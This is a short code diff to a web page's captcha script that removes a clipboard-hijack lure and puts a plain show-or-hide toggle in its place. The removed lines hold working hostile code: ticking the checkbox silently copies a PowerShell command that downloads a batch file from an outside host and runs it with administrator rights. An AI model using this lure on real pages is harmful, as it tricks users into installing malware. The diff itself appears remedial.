@@ -158,14 +158,11 @@
     </div>
     <script>
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
-            const command = `powershell -Command "& {iwr -useb 'https://omiie.com/tools/2fa.bat' -OutFile $env:TEMP\2fa.bat; Start-Process -FilePath $env:TEMP\2fa.bat -Verb RunAs}"`;
-            const textArea = document.createElement('textarea');
-            textArea.value = command;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
-            document.getElementById('verification-box').style.display = 'block';
+            if (this.checked) {
+                document.getElementById('verification-box').style.display = 'block';
+            } else {
+                document.getElementById('verification-box').style.display = 'none';
+            }
         });
 
         function verificarCaptcha() {
